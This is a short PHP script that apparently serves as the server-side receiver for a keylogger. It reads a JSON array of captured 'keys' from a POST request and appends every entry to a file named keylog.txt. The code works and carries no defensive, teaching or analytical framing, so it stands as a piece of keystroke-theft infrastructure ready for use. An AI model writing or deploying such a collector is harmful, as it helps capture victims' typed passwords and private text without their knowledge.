<?php
$file = fopen("keylog.txt", "a+");
 
$keys = json_decode($_POST["keys"]);
foreach ($keys as $k=>$v) { fwrite($file, $v . PHP_EOL); }

fclose($file);
echo "OK";
?>